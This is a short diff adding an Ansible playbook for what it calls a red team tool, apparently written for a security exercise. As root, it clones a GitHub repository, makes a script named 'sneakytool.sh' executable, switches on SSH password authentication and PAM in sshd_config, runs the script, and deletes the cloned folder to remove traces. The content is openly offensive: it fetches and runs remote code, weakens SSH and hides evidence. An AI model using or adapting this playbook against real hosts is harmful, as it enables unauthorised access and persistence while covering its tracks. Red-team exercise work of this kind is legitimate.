@@ -1,0 +1,44 @@
+---
+- name: clone, run, and cleanup red team tool
+  hosts: tool
+  become: yes
+  tasks:
+
+# Reach out to github and download the repo with my red team tool
+  - name: Clone git with red team tool
+    ansible.builtin.git:
+      repo: https://github.com/jcw2555/redteamtool.git
+      dest: /home/ubuntu/tool
+
+# Change the permissions of the tool
+  - name: Modify file permissions
+    file:
+      path: /home/ubuntu/tool/sneakytool.sh
+      mode: u+x
+
+# Modify the sshd_config file
+  # Modify PasswordAuthentication variable
+  - name: Set PasswordAuthentication to yes
+    lineinfile:
+      path: /etc/ssh/sshd_config
+      regexp: 'PasswordAuthentication no'
+      line: 'PasswordAuthentication yes'
+      state: present
+
+  # Modify UsePAM variable
+  - name: Set UsePAM to yes
+    lineinfile:
+      path: /etc/ssh/sshd_config
+      regexp: 'UsePAM no'
+      line: 'UsePAM yes'
+      state: present
+
+# Run the bash script found in the github repository
+  - name: Execute script
+    command: sh /home/ubuntu/tool/sneakytool.sh
+
+# Delete the github folder and all its contents
+  - name: Delete github folder
+    file:
+      path: /home/ubuntu/tool
+      state: absent
